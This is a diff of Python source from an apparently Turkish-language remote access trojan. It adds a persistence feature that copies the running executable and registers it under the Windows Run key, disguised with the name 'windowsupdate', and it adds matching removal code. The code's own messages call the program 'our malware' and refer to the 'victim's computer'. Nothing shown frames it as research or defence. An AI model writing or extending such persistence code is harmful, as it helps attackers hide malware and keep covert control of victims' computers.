@@ -120,9 +120,13 @@ class Soket_baglanti():
             return "[+]Kalicilik zaten aktif."
         if not os.path.exists(self.tro_dosyasi):
             shutil.copyfile(sys.executable, self.tro_dosyasi)
+            regedit_komutu = "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v windowsupdate /t REG_SZ /d " + self.tro_dosyasi
+            subprocess.call(regedit_komutu,shell=True)
             return "[+]Kalicilik aktifleştirildi."
     def Kalicilik_Kaldir(self):
         if os.path.exists(self.tro_dosyasi):
+            regedit_komutu = "reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v windowsupdate /f"
+            subprocess.call(regedit_komutu,shell=True)
             os.remove(self.tro_dosyasi)
             return "[+]Zararlı yazılımımız appdata klasöründe kaldırıldı ve kurban bilgisayarını her açtığında çalışmayacak."
         else:
